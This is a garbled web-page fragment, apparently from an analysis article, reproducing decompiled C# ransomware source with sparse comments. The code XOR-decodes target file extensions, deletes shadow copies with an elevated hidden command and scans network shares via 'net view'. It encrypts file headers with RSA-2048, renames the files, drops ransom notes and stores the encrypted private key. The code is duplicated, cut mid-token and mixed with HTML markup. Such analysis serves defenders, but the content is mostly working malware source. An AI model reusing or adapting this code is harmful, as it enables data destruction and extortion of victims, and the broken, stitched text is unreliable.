0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> 0xa6, 0xa3, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , <code class="cs hljs"><span class="hljs-keyword"><span 